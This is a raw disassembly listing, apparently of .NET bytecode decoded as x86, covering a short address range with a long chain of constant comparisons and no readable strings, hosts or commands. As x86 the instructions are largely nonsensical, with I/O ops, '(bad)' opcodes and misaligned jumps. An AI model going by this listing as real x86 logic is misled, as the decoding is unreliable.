  4030ad:	00 00                	add    %al,(%eax)
  4030af:	0a 28                	or     (%eax),%ch
  4030b1:	3b 00                	cmp    (%eax),%eax
  4030b3:	00 0a                	add    %cl,(%edx)
  4030b5:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4030b8:	00 06                	add    %al,(%esi)
  4030ba:	de 08                	fimuls (%eax)
  4030bc:	02 06                	add    (%esi),%al
  4030be:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4030c1:	00 06                	add    %al,(%esi)
  4030c3:	dc 2a                	fsubrl (%edx)
  4030c5:	00 00                	add    %al,(%eax)
  4030c7:	00 01                	add    %al,(%ecx)
  4030c9:	34 00                	xor    $0x0,%al
  4030cb:	00 02                	add    %al,(%edx)
  4030cd:	00 83 00 4a cd 00    	add    %al,0xcd4a00(%ebx)
  4030d3:	0c 00                	or     $0x0,%al
  4030d5:	00 00                	add    %al,(%eax)
  4030d7:	00 00                	add    %al,(%eax)
  4030d9:	00 6f 01             	add    %ch,0x1(%edi)
  4030dc:	15 84 01 25 56       	adc    $0x56250184,%eax
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	01 00                	add    %eax,(%eax)
  4030e5:	00 aa 01 97 41 02    	add    %ch,0x2419701(%edx)
  4030eb:	1b 56 00             	sbb    0x0(%esi),%edx
  4030ee:	00 01                	add    %al,(%ecx)
  4030f0:	02 00                	add    (%eax),%al
  4030f2:	aa                   	stos   %al,%es:(%edi)
  4030f3:	01 b2 5c 02 08 00    	add    %esi,0x8025c(%edx)
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	00 13                	add    %dl,(%ebx)
  4030fd:	30 03                	xor    %al,(%ebx)
  4030ff:	00 28                	add    %ch,(%eax)
  403101:	00 00                	add    %al,(%eax)
  403103:	00 05 00 00 11 73    	add    %al,0x73110000
  403109:	33 00                	xor    (%eax),%eax
  40310b:	00 0a                	add    %cl,(%edx)
  40310d:	0a 06                	or     (%esi),%al
  40310f:	72 81                	jb     0x403092
  403111:	00 00                	add    %al,(%eax)
  403113:	70 72                	jo     0x403187
  403115:	d6                   	salc
  403116:	07                   	pop    %es
  403117:	00 70 6f             	add    %dh,0x6f(%eax)
  40311a:	34 00                	xor    $0x0,%al
  40311c:	00 0a                	add    %cl,(%edx)
  40311e:	02 7b 3d             	add    0x3d(%ebx),%bh
  403121:	00 00                	add    %al,(%eax)
  403123:	04 06                	add    $0x6,%al
  403125:	6f                   	outsl  %ds:(%esi),(%dx)
  403126:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  40312b:	4f                   	dec    %edi
  40312c:	00 00                	add    %al,(%eax)
  40312e:	06                   	push   %es
  40312f:	2a 1b                	sub    (%ebx),%bl
  403131:	30 03                	xor    %al,(%ebx)
  403133:	00 93 00 00 00 09    	add    %dl,0x9000000(%ebx)
  403139:	00 00                	add    %al,(%eax)
  40313b:	11 02                	adc    %eax,(%edx)
  40313d:	7b 40                	jnp    0x40317f
  40313f:	00 00                	add    %al,(%eax)
  403141:	04 03                	add    $0x3,%al
  403143:	12 00                	adc    (%eax),%al
  403145:	6f                   	outsl  %ds:(%esi),(%dx)
  403146:	7c 00                	jl     0x403148
  403148:	00 0a                	add    %cl,(%edx)
  40314a:	2c 09                	sub    $0x9,%al
  40314c:	06                   	push   %es
  40314d:	2c 06                	sub    $0x6,%al
  40314f:	06                   	push   %es
  403150:	28 7d 00             	sub    %bh,0x0(%ebp)
  403153:	00 0a                	add    %cl,(%edx)
  403155:	02 7b 41             	add    0x41(%ebx),%bh
  403158:	00 00                	add    %al,(%eax)
  40315a:	04 03                	add    $0x3,%al
  40315c:	12 02                	adc    (%edx),%al
  40315e:	6f                   	outsl  %ds:(%esi),(%dx)
  40315f:	7e 00                	jle    0x403161
  403161:	00 0a                	add    %cl,(%edx)
  403163:	26 02 7b 42          	add    %es:0x42(%ebx),%bh
  403167:	00 00                	add    %al,(%eax)
  403169:	04 03                	add    $0x3,%al
  40316b:	12 03                	adc    (%ebx),%al
  40316d:	6f                   	outsl  %ds:(%esi),(%dx)
  40316e:	7f 00                	jg     0x403170
  403170:	00 0a                	add    %cl,(%edx)
  403172:	26 02 7b 3a          	add    %es:0x3a(%ebx),%bh
  403176:	00 00                	add    %al,(%eax)
  403178:	04 03                	add    $0x3,%al
  40317a:	12 01                	adc    (%ecx),%al
  40317c:	6f                   	outsl  %ds:(%esi),(%dx)
  40317d:	80 00 00             	addb   $0x0,(%eax)
  403180:	0a 2c 3c             	or     (%esp,%edi,1),%ch
  403183:	07                   	pop    %es
  403184:	6f                   	outsl  %ds:(%esi),(%dx)
  403185:	81 00 00 0a 13 04    	addl   $0x4130a00,(%eax)
  40318b:	2b 1b                	sub    (%ebx),%ebx
  40318d:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403190:	82 00 00             	addb   $0x0,(%eax)
  403193:	0a 13                	or     (%ebx),%dl
  403195:	05 12 05 28 83       	add    $0x83280512,%eax
  40319a:	00 00                	add    %al,(%eax)
  40319c:	0a 25 2d 03 26 2b    	or     0x2b26032d,%ah
  4031a2:	05 28 84 00 00       	add    $0x8428,%eax
  4031a7:	0a 11                	or     (%ecx),%dl
  4031a9:	04 6f                	add    $0x6f,%al
  4031ab:	85 00                	test   %eax,(%eax)
  4031ad:	00 0a                	add    %cl,(%edx)
  4031af:	2d dc de 0c 11       	sub    $0x110cdedc,%eax
  4031b4:	04 2c                	add    $0x2c,%al
  4031b6:	07                   	pop    %es
  4031b7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4031ba:	26 00 00             	add    %al,%es:(%eax)
  4031bd:	0a dc                	or     %ah,%bl
  4031bf:	02 7b 3b             	add    0x3b(%ebx),%bh
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	04 03                	add    $0x3,%al
  4031c6:	12 06                	adc    (%esi),%al
  4031c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c9:	86 00                	xchg   %al,(%eax)
  4031cb:	00 0a                	add    %cl,(%edx)
  4031cd:	26 2a 00             	sub    %es:(%eax),%al
  4031d0:	01 10                	add    %edx,(%eax)
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	02 00                	add    (%eax),%al
  4031d6:	4f                   	dec    %edi
  4031d7:	00 28                	add    %ch,(%eax)
  4031d9:	77 00                	ja     0x4031db
  4031db:	0c 00                	or     $0x0,%al
  4031dd:	00 00                	add    %al,(%eax)
  4031df:	00 1b                	add    %bl,(%ebx)
  4031e1:	30 06                	xor    %al,(%esi)
  4031e3:	00 a2 00 00 00 0a    	add    %ah,0xa000000(%edx)
  4031e9:	00 00                	add    %al,(%eax)
  4031eb:	11 02                	adc    %eax,(%edx)
  4031ed:	7b 3f                	jnp    0x40322e
  4031ef:	00 00                	add    %al,(%eax)
  4031f1:	04 2c                	add    $0x2c,%al
  4031f3:	0e                   	push   %cs
  4031f4:	02 7b 3e             	add    0x3e(%ebx),%bh
  4031f7:	00 00                	add    %al,(%eax)
  4031f9:	04 14                	add    $0x14,%al
  4031fb:	28 87 00 00 0a 2c    	sub    %al,0x2c0a0000(%edi)
  403201:	0b 72 e8             	or     -0x18(%edx),%esi
  403204:	07                   	pop    %es
  403205:	00 70 28             	add    %dh,0x28(%eax)
  403208:	53                   	push   %ebx
  403209:	00 00                	add    %al,(%eax)
  40320b:	0a 2a                	or     (%edx),%ch
  40320d:	00 02                	add    %al,(%edx)
  40320f:	7b 3e                	jnp    0x40324f
  403211:	00 00                	add    %al,(%eax)
  403213:	04 72                	add    $0x72,%al
  403215:	a0 06 00 70 16       	mov    0x16700006,%al
  40321a:	17                   	pop    %ss
  40321b:	6f                   	outsl  %ds:(%esi),(%dx)
  40321c:	78 00                	js     0x40321e
  40321e:	00 0a                	add    %cl,(%edx)
  403220:	25 2d 04 26 14       	and    $0x1426042d,%eax
  403225:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  403228:	3a 08                	cmp    (%eax),%cl
  40322a:	00 70 1f             	add    %dh,0x1f(%eax)
  40322d:	19 28                	sbb    %ebp,(%eax)
  40322f:	88 00                	mov    %al,(%eax)
  403231:	00 0a                	add    %cl,(%edx)
  403233:	0a 06                	or     (%esi),%al
  403235:	14 28                	adc    $0x28,%al
  403237:	89 00                	mov    %eax,(%eax)
  403239:	00 0a                	add    %cl,(%edx)
  40323b:	2c 24                	sub    $0x24,%al
  40323d:	02 7b 3d             	add    0x3d(%ebx),%bh
  403240:	00 00                	add    %al,(%eax)
  403242:	04 73                	add    $0x73,%al
  403244:	0d 00 00 06 0b       	or     $0xb060000,%eax
  403249:	06                   	push   %es
  40324a:	14 18                	adc    $0x18,%al
  40324c:	8d 02                	lea    (%edx),%eax
  40324e:	00 00                	add    %al,(%eax)
  403250:	01 25 16 07 a2 25    	add    %esp,0x25a20716
  403256:	17                   	pop    %ss
  403257:	03 a2 6f 7b 00 00    	add    0x7b6f(%edx),%esp
  40325d:	0a 26                	or     (%esi),%ah
  40325f:	2b 0a                	sub    (%edx),%ecx
  403261:	72 4a                	jb     0x4032ad
  403263:	08 00                	or     %al,(%eax)
  403265:	70 28                	jo     0x40328f
  403267:	53                   	push   %ebx
  403268:	00 00                	add    %al,(%eax)
  40326a:	0a de                	or     %dh,%bl
  40326c:	20 0c 72             	and    %cl,(%edx,%esi,2)
  40326f:	8c 08                	mov    %cs,(%eax)
  403271:	00 70 03             	add    %dh,0x3(%eax)
  403274:	08 25 2d 04 26 14    	or     %ah,0x1426042d
  40327a:	2b 05 6f 3a 00 00    	sub    0x3a6f,%eax
  403280:	0a 28                	or     (%eax),%ch
  403282:	38 00                	cmp    %al,(%eax)
  403284:	00 0a                	add    %cl,(%edx)
  403286:	28 53 00             	sub    %dl,0x0(%ebx)
  403289:	00 0a                	add    %cl,(%edx)
  40328b:	de 00                	fiadds (%eax)
  40328d:	2a 00                	sub    (%eax),%al
  40328f:	00 01                	add    %al,(%ecx)
  403291:	10 00                	adc    %al,(%eax)
  403293:	00 00                	add    %al,(%eax)
  403295:	00 22                	add    %ah,(%edx)
  403297:	00 5f 81             	add    %bl,-0x7f(%edi)
  40329a:	00 20                	add    %ah,(%eax)
  40329c:	56                   	push   %esi
  40329d:	00 00                	add    %al,(%eax)
  40329f:	01 1b                	add    %ebx,(%ebx)
  4032a1:	30 0a                	xor    %cl,(%edx)
  4032a3:	00 56 3e             	add    %dl,0x3e(%esi)
  4032a6:	00 00                	add    %al,(%eax)
  4032a8:	0b 00                	or     (%eax),%eax
  4032aa:	00 11                	add    %dl,(%ecx)
  4032ac:	03 2d 01 2a 73 8a    	add    0x8a732a01,%ebp
  4032b2:	00 00                	add    %al,(%eax)
  4032b4:	0a 0a                	or     (%edx),%cl
  4032b6:	06                   	push   %es
  4032b7:	03 6f 8b             	add    -0x75(%edi),%ebp
  4032ba:	00 00                	add    %al,(%eax)
  4032bc:	0a 06                	or     (%esi),%al
  4032be:	72 81                	jb     0x403241
  4032c0:	00 00                	add    %al,(%eax)
  4032c2:	70 6f                	jo     0x403333
  4032c4:	5b                   	pop    %ebx
  4032c5:	00 00                	add    %al,(%eax)
  4032c7:	0a 0b                	or     (%ebx),%cl
  4032c9:	07                   	pop    %es
  4032ca:	72 ac                	jb     0x403278
  4032cc:	08 00                	or     %al,(%eax)
  4032ce:	70 28                	jo     0x4032f8
  4032d0:	75 00                	jne    0x4032d2
  4032d2:	00 0a                	add    %cl,(%edx)
  4032d4:	2c 10                	sub    $0x10,%al
  4032d6:	72 b6                	jb     0x40328e
  4032d8:	08 00                	or     %al,(%eax)
  4032da:	70 07                	jo     0x4032e3
  4032dc:	28 3b                	sub    %bh,(%ebx)
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 28                	or     (%eax),%ch
  4032e2:	53                   	push   %ebx
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	0a 07                	or     (%edi),%al
  4032e7:	28 87 00 00 06 0c    	sub    %al,0xc060000(%edi)
  4032ed:	08 20                	or     %ah,(%eax)
  4032ef:	42                   	inc    %edx
  4032f0:	ff 04 7e             	incl   (%esi,%edi,2)
  4032f3:	42                   	inc    %edx
  4032f4:	c5 04 00             	lds    (%eax,%eax,1),%eax
  4032f7:	00 08                	add    %cl,(%eax)
  4032f9:	20 6a 11             	and    %ch,0x11(%edx)
  4032fc:	13 30                	adc    (%eax),%esi
  4032fe:	42                   	inc    %edx
  4032ff:	5d                   	pop    %ebp
  403300:	02 00                	add    (%eax),%al
  403302:	00 08                	add    %cl,(%eax)
  403304:	20 58 20             	and    %bl,0x20(%eax)
  403307:	59                   	pop    %ecx
  403308:	1b 42 29             	sbb    0x29(%edx),%eax
  40330b:	01 00                	add    %eax,(%eax)
  40330d:	00 08                	add    %cl,(%eax)
  40330f:	20 33                	and    %dh,(%ebx)
  403311:	1e                   	push   %ds
  403312:	6d                   	insl   (%dx),%es:(%edi)
  403313:	0f 42 8f 00 00 00 08 	cmovb  0x8000000(%edi),%ecx
  40331a:	20 5e 3e             	and    %bl,0x3e(%esi)
  40331d:	6e                   	outsb  %ds:(%esi),(%dx)
  40331e:	04 35                	add    $0x35,%al
  403320:	3e 08 20             	or     %ah,%ds:(%eax)
  403323:	37                   	aaa
  403324:	ff 68 03             	ljmp   *0x3(%eax)
  403327:	35 1b 08 20 78       	xor    $0x7820081b,%eax
  40332c:	99                   	cltd
  40332d:	7d 02                	jge    0x403331
  40332f:	3b 9b 12 00 00 08    	cmp    0x8000012(%ebx),%ebx
  403335:	20 37                	and    %dh,(%edi)
  403337:	ff 68 03             	ljmp   *0x3(%eax)
  40333a:	3b 37                	cmp    (%edi),%esi
  40333c:	0e                   	push   %cs
  40333d:	00 00                	add    %al,(%eax)
  40333f:	38 86 3d 00 00 08    	cmp    %al,0x800003d(%esi)
  403345:	20 86 99 6d 04 3b    	and    %al,0x3b046d99(%esi)
  40334b:	e8 0d 00 00 08       	call   0x840335d
  403350:	20 5e 3e             	and    %bl,0x3e(%esi)
  403353:	6e                   	outsb  %ds:(%esi),(%dx)
  403354:	04 3b                	add    $0x3b,%al
  403356:	3a 11                	cmp    (%ecx),%dl
  403358:	00 00                	add    %al,(%eax)
  40335a:	38 6b 3d             	cmp    %ch,0x3d(%ebx)
  40335d:	00 00                	add    %al,(%eax)
  40335f:	08 20                	or     %ah,(%eax)
  403361:	bd 99 3c 0b 35       	mov    $0x350b3c99,%ebp
  403366:	1b 08                	sbb    (%eax),%ecx
  403368:	20 4e 73             	and    %cl,0x73(%esi)
  40336b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40336c:	09 3b                	or     %edi,(%ebx)
  40336e:	43                   	inc    %ebx
  40336f:	0e                   	push   %cs
  403370:	00 00                	add    %al,(%eax)
  403372:	08 20                	or     %ah,(%eax)
  403374:	bd 99 3c 0b 3b       	mov    $0x3b0b3c99,%ebp
  403379:	9c                   	pushf
  40337a:	0a 00                	or     (%eax),%al
  40337c:	00 38                	add    %bh,(%eax)
  40337e:	48                   	dec    %eax
  40337f:	3d 00 00 08 20       	cmp    $0x20080000,%eax
  403384:	02 06                	add    (%esi),%al
  403386:	e6 0b                	out    %al,$0xb
  403388:	3b bb 0e 00 00 08    	cmp    0x800000e(%ebx),%edi
  40338e:	20 97 b5 81 0d 3b    	and    %dl,0x3b0d81b5(%edi)
  403394:	3f                   	aas
  403395:	10 00                	adc    %al,(%eax)
  403397:	00 08                	add    %cl,(%eax)
  403399:	20 33                	and    %dh,(%ebx)
  40339b:	1e                   	push   %ds
  40339c:	6d                   	insl   (%dx),%es:(%edi)
  40339d:	0f 3b                	(bad)
  40339f:	c3                   	ret
  4033a0:	11 00                	adc    %eax,(%eax)
  4033a2:	00 38                	add    %bh,(%eax)
  4033a4:	22 3d 00 00 08 20    	and    0x20080000,%bh
  4033aa:	5c                   	pop    %esp
  4033ab:	09 c0                	or     %eax,%eax
  4033ad:	12 35 3e 08 20 a1    	adc    0xa120083e,%dh
  4033b3:	2d a0 12 35 1b       	sub    $0x1b3512a0,%eax
  4033b8:	08 20                	or     %ah,(%eax)
  4033ba:	71 7f                	jno    0x40343b
  4033bc:	f8                   	clc
  4033bd:	0f 3b                	(bad)
  4033bf:	1d 13 00 00 08       	sbb    $0x8000013,%eax
  4033c4:	20 a1 2d a0 12 3b    	and    %ah,0x3b12a02d(%ecx)
  4033ca:	75 0a                	jne    0x4033d6
  4033cc:	00 00                	add    %al,(%eax)
  4033ce:	38 f7                	cmp    %dh,%bh
  4033d0:	3c 00                	cmp    $0x0,%al
  4033d2:	00 08                	add    %cl,(%eax)
  4033d4:	20 3b                	and    %bh,(%ebx)
  4033d6:	cf                   	iret
  4033d7:	a3 12 3b ec 0d       	mov    %eax,0xdec3b12
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	08 20                	or     %ah,(%eax)
  4033e0:	5c                   	pop    %esp
  4033e1:	09 c0                	or     %eax,%eax
  4033e3:	12 3b                	adc    (%ebx),%bh
  4033e5:	20 0e                	and    %cl,(%esi)
  4033e7:	00 00                	add    %al,(%eax)
  4033e9:	38 dc                	cmp    %bl,%ah
  4033eb:	3c 00                	cmp    $0x0,%al
  4033ed:	00 08                	add    %cl,(%eax)
  4033ef:	20 a9 0d e5 18 35    	and    %ch,0x3518e50d(%ecx)
  4033f5:	1b 08                	sbb    (%eax),%ecx
  4033f7:	20 09                	and    %cl,(%ecx)
  4033f9:	1b 7a 15             	sbb    0x15(%edx),%edi
  4033fc:	3b c6                	cmp    %esi,%eax
  4033fe:	13 00                	adc    (%eax),%eax
  403400:	00 08                	add    %cl,(%eax)
  403402:	20 a9 0d e5 18 3b    	and    %ch,0x3b18e50d(%ecx)
  403408:	b9 09 00 00 38       	mov    $0x38000009,%ecx
  40340d:	b9 3c 00 00 08       	mov    $0x800003c,%ecx
  403412:	20 3a                	and    %bh,(%edx)
  403414:	dc 67 19             	fsubl  0x19(%edi)
  403417:	3b 41 0e             	cmp    0xe(%ecx),%eax
  40341a:	00 00                	add    %al,(%eax)
  40341c:	08 20                	or     %ah,(%eax)
  40341e:	2c 2b                	sub    $0x2b,%al
  403420:	40                   	inc    %eax
  403421:	1a 3b                	sbb    (%ebx),%bh
  403423:	da 0f                	fimull (%edi)
  403425:	00 00                	add    %al,(%eax)
  403427:	08 20                	or     %ah,(%eax)
  403429:	58                   	pop    %eax
  40342a:	20 59 1b             	and    %bl,0x1b(%ecx)
  40342d:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  403430:	00 00                	add    %al,(%eax)
  403432:	38 93 3c 00 00 08    	cmp    %dl,0x800003c(%ebx)
  403438:	20 f9                	and    %bh,%cl
  40343a:	1c d2                	sbb    $0xd2,%al
  40343c:	27                   	daa
  40343d:	42                   	inc    %edx
  40343e:	8f 00                	pop    (%eax)
  403440:	00 00                	add    %al,(%eax)
  403442:	08 20                	or     %ah,(%eax)
  403444:	16                   	push   %ss
  403445:	26 10 25 35 3e 08 20 	adc    %ah,%es:0x20083e35
  40344c:	b8 28 5a 22 35       	mov    $0x35225a28,%eax
  403451:	1b 08                	sbb    (%eax),%ecx
  403453:	20 40 56             	and    %al,0x56(%eax)
  403456:	6b 20 3b             	imul   $0x3b,(%eax),%esp
  403459:	15 0e 00 00 08       	adc    $0x800000e,%eax
  40345e:	20 b8 28 5a 22 3b    	and    %bh,0x3b225a28(%eax)
  403464:	f0 09 00             	lock or %eax,(%eax)
  403467:	00 38                	add    %bh,(%eax)
  403469:	5d                   	pop    %ebp
  40346a:	3c 00                	cmp    $0x0,%al
  40346c:	00 08                	add    %cl,(%eax)
  40346e:	20 cb                	and    %cl,%bl
  403470:	d8 79 22             	fdivrs 0x22(%ecx)
  403473:	3b 17                	cmp    (%edi),%edx
  403475:	0c 00                	or     $0x0,%al
  403477:	00 08                	add    %cl,(%eax)
  403479:	20 16                	and    %dl,(%esi)
  40347b:	26 10 25 3b c1 0e 00 	adc    %ah,%es:0xec13b
  403482:	00 38                	add    %bh,(%eax)
  403484:	42                   	inc    %edx
  403485:	3c 00                	cmp    $0x0,%al
  403487:	00 08                	add    %cl,(%eax)
  403489:	20 f8                	and    %bh,%al
  40348b:	55                   	push   %ebp
  40348c:	4f                   	dec    %edi
  40348d:	25 35 1b 08 20       	and    $0x20081b35,%eax
  403492:	7c f0                	jl     0x403484
  403494:	17                   	pop    %ss
  403495:	25 3b 8f 0a 00       	and    $0xa8f3b,%eax
  40349a:	00 08                	add    %cl,(%eax)
  40349c:	20 f8                	and    %bh,%al
  40349e:	55                   	push   %ebp
  40349f:	4f                   	dec    %edi
  4034a0:	25 3b 88 09 00       	and    $0x9883b,%eax
  4034a5:	00 38                	add    %bh,(%eax)
  4034a7:	1f                   	pop    %ds
  4034a8:	3c 00                	cmp    $0x0,%al
  4034aa:	00 08                	add    %cl,(%eax)
  4034ac:	20 da                	and    %bl,%dl
  4034ae:	3e 7f 25             	jg,pt  0x4034d6
  4034b1:	3b 10                	cmp    (%eax),%edx
  4034b3:	0e                   	push   %cs
  4034b4:	00 00                	add    %al,(%eax)
  4034b6:	08 20                	or     %ah,(%eax)
  4034b8:	38 a5 c0 26 3b d2    	cmp    %ah,-0x2dc4d940(%ebp)
  4034be:	0a 00                	or     (%eax),%al
  4034c0:	00 08                	add    %cl,(%eax)
  4034c2:	20 f9                	and    %bh,%cl
  4034c4:	1c d2                	sbb    $0xd2,%al
  4034c6:	27                   	daa
  4034c7:	3b 10                	cmp    (%eax),%edx
  4034c9:	13 00                	adc    (%eax),%eax
  4034cb:	00 38                	add    %bh,(%eax)
  4034cd:	f9                   	stc
  4034ce:	3b 00                	cmp    (%eax),%eax
  4034d0:	00 08                	add    %cl,(%eax)
  4034d2:	20 92 cf 67 2c 35    	and    %dl,0x352c67cf(%edx)
  4034d8:	3e 08 20             	or     %ah,%ds:(%eax)
  4034db:	cc                   	int3
  4034dc:	4d                   	dec    %ebp
  4034dd:	a0 2a 35 1b 08       	mov    0x81b352a,%al
  4034e2:	20 12                	and    %dl,(%edx)
  4034e4:	e5 27                	in     $0x27,%eax
  4034e6:	28 3b                	sub    %bh,(%ebx)
  4034e8:	c4 08                	les    (%eax),%ecx
  4034ea:	00 00                	add    %al,(%eax)
  4034ec:	08 20                	or     %ah,(%eax)
  4034ee:	cc                   	int3
  4034ef:	4d                   	dec    %ebp
  4034f0:	a0 2a 3b a5 0d       	mov    0xda53b2a,%al
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	38 ce                	cmp    %cl,%dh
  4034f9:	3b 00                	cmp    (%eax),%eax
  4034fb:	00 08                	add    %cl,(%eax)
  4034fd:	20 b9 dc ee 2b 3b    	and    %bh,0x3b2beedc(%ecx)
  403503:	7c 0e                	jl     0x403513
  403505:	00 00                	add    %al,(%eax)
  403507:	08 20                	or     %ah,(%eax)
  403509:	92                   	xchg   %eax,%edx
  40350a:	cf                   	iret
  40350b:	67 2c 3b             	addr16 sub $0x3b,%al
  40350e:	7e 10                	jle    0x403520
  403510:	00 00                	add    %al,(%eax)
  403512:	38 b3 3b 00 00 08    	cmp    %dh,0x800003b(%ebx)
  403518:	20 24 04             	and    %ah,(%esp,%eax,1)
  40351b:	00 2e                	add    %ch,(%esi)
  40351d:	35 1b 08 20 df       	xor    $0xdf20081b,%eax
  403522:	e1 d3                	loope  0x4034f7
  403524:	2c 3b                	sub    $0x3b,%al
  403526:	dc 12                	fcoml  (%edx)
  403528:	00 00                	add    %al,(%eax)
  40352a:	08 20                	or     %ah,(%eax)
  40352c:	24 04                	and    $0x4,%al
  40352e:	00 2e                	add    %ch,(%esi)
  403530:	3b bf 0c 00 00 38    	cmp    0x3800000c(%edi),%edi
  403536:	90                   	nop
  403537:	3b 00                	cmp    (%eax),%eax
  403539:	00 08                	add    %cl,(%eax)
  40353b:	20 8c ed 44 2f 3b 29 	and    %cl,0x293b2f44(%ebp,%ebp,8)
  403542:	0e                   	push   %cs
  403543:	00 00                	add    %al,(%eax)
  403545:	08 20                	or     %ah,(%eax)
  403547:	a8 2c                	test   $0x2c,%al
  403549:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40354a:	2f                   	das
  40354b:	3b 3c 11             	cmp    (%ecx,%edx,1),%edi
  40354e:	00 00                	add    %al,(%eax)
  403550:	08 20                	or     %ah,(%eax)
  403552:	6a 11                	push   $0x11
  403554:	13 30                	adc    (%eax),%esi
  403556:	3b ba 09 00 00 38    	cmp    0x38000009(%edx),%edi
  40355c:	6a 3b                	push   $0x3b
  40355e:	00 00                	add    %al,(%eax)
  403560:	08 20                	or     %ah,(%eax)
  403562:	72 27                	jb     0x40358b
  403564:	de 58 42             	ficomps 0x42(%eax)
  403567:	29 01                	sub    %eax,(%ecx)
  403569:	00 00                	add    %al,(%eax)
  40356b:	08 20                	or     %ah,(%eax)
  40356d:	7e dc                	jle    0x40354b
  40356f:	5c                   	pop    %esp
  403570:	43                   	inc    %ebx
  403571:	42                   	inc    %edx
  403572:	8f 00                	pop    (%eax)
  403574:	00 00                	add    %al,(%eax)
  403576:	08 20                	or     %ah,(%eax)
  403578:	c3                   	ret
  403579:	6c                   	insb   (%dx),%es:(%edi)
  40357a:	27                   	daa
  40357b:	3a 35 3e 08 20 9a    	cmp    0x9a20083e,%dh
  403581:	61                   	popa
  403582:	dc 35 35 1b 08 20    	fdivl  0x20081b35
  403588:	cd 0d                	int    $0xd
  40358a:	54                   	push   %esp
  40358b:	34 3b                	xor    $0x3b,%al
  40358d:	f6 0c 00 00          	testb  $0x0,(%eax,%eax,1)
  403591:	08 20                	or     %ah,(%eax)
  403593:	9a 61 dc 35 3b 8f 0e 	lcall  $0xe8f,$0x3b35dc61
  40359a:	00 00                	add    %al,(%eax)
  40359c:	38 29                	cmp    %ch,(%ecx)
  40359e:	3b 00                	cmp    (%eax),%eax
  4035a0:	00 08                	add    %cl,(%eax)
  4035a2:	20 bd 16 70 38 3b    	and    %bh,0x3b387016(%ebp)
  4035a8:	f8                   	clc
  4035a9:	0a 00                	or     (%eax),%al
  4035ab:	00 08                	add    %cl,(%eax)
  4035ad:	20 c3                	and    %al,%bl
  4035af:	6c                   	insb   (%dx),%es:(%edi)
  4035b0:	27                   	daa
  4035b1:	3a 3b                	cmp    (%ebx),%bh
  4035b3:	35 0e 00 00 38       	xor    $0x3800000e,%eax
  4035b8:	0e                   	push   %cs
  4035b9:	3b 00                	cmp    (%eax),%eax
  4035bb:	00 08                	add    %cl,(%eax)
  4035bd:	20 74 9f 60          	and    %dh,0x60(%edi,%ebx,4)
  4035c1:	3f                   	aas
  4035c2:	35 1b 08 20 74       	xor    $0x7420081b,%eax
  4035c7:	58                   	pop    %eax
  4035c8:	da 3e                	fidivrl (%esi)
  4035ca:	3b 69 10             	cmp    0x10(%ecx),%ebp
  4035cd:	00 00                	add    %al,(%eax)
  4035cf:	08 20                	or     %ah,(%eax)
  4035d1:	74 9f                	je     0x403572
  4035d3:	60                   	pusha
  4035d4:	3f                   	aas
  4035d5:	3b e7                	cmp    %edi,%esp
  4035d7:	08 00                	or     %al,(%eax)
  4035d9:	00 38                	add    %bh,(%eax)
  4035db:	eb 3a                	jmp    0x403617
  4035dd:	00 00                	add    %al,(%eax)
  4035df:	08 20                	or     %ah,(%eax)
  4035e1:	27                   	daa
  4035e2:	a2 b4 3f 3b 9c       	mov    %al,0x9c3b3fb4
  4035e7:	07                   	pop    %es
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	08 20                	or     %ah,(%eax)
  4035ec:	9e                   	sahf
  4035ed:	a8 be                	test   $0xbe,%al
  4035ef:	40                   	inc    %eax
  4035f0:	3b 5f 09             	cmp    0x9(%edi),%ebx
  4035f3:	00 00                	add    %al,(%eax)
  4035f5:	08 20                	or     %ah,(%eax)
  4035f7:	7e dc                	jle    0x4035d5
  4035f9:	5c                   	pop    %esp
  4035fa:	43                   	inc    %ebx
  4035fb:	3b c2                	cmp    %edx,%eax
  4035fd:	0d 00 00 38 c5       	or     $0xc5380000,%eax
  403602:	3a 00                	cmp    (%eax),%al
  403604:	00 08                	add    %cl,(%eax)
  403606:	20 7b bc             	and    %bh,-0x44(%ebx)
  403609:	3e 48                	ds dec %eax
  40360b:	35 3e 08 20 0b       	xor    $0xb20083e,%eax
  403610:	fa                   	cli
  403611:	81 46 35 1b 08 20 65 	addl   $0x6520081b,0x35(%esi)
  403618:	00 57 45             	add    %dl,0x45(%edi)
  40361b:	3b 02                	cmp    (%edx),%eax
  40361d:	0b 00                	or     (%eax),%eax
  40361f:	00 08                	add    %cl,(%eax)
  403621:	20 0b                	and    %cl,(%ebx)
  403623:	fa                   	cli
  403624:	81 46 3b 11 0f 00 00 	addl   $0xf11,0x3b(%esi)
  40362b:	38 9a 3a 00 00 08    	cmp    %bl,0x800003a(%edx)
  403631:	20 86 66 b2 46 3b    	and    %al,0x3b46b266(%esi)
  403637:	64 06                	fs push %es
  403639:	00 00                	add    %al,(%eax)
  40363b:	08 20                	or     %ah,(%eax)
  40363d:	7b bc                	jnp    0x4035fb
  40363f:	3e 48                	ds dec %eax
  403641:	3b 0b                	cmp    (%ebx),%ecx
  403643:	0f 00 00             	sldt   (%eax)
  403646:	38 7f 3a             	cmp    %bh,0x3a(%edi)
  403649:	00 00                	add    %al,(%eax)
  40364b:	08 20                	or     %ah,(%eax)
  40364d:	5f                   	pop    %edi
  40364e:	d0 27                	shlb   $1,(%edi)
  403650:	50                   	push   %eax
  403651:	35 1b 08 20 3b       	xor    $0x3b20081b,%eax
  403656:	c1 04 4e 3b          	roll   $0x3b,(%esi,%ecx,2)
  40365a:	6b 06 00             	imul   $0x0,(%esi),%eax
  40365d:	00 08                	add    %cl,(%eax)
  40365f:	20 5f d0             	and    %bl,-0x30(%edi)
  403662:	27                   	daa
  403663:	50                   	push   %eax
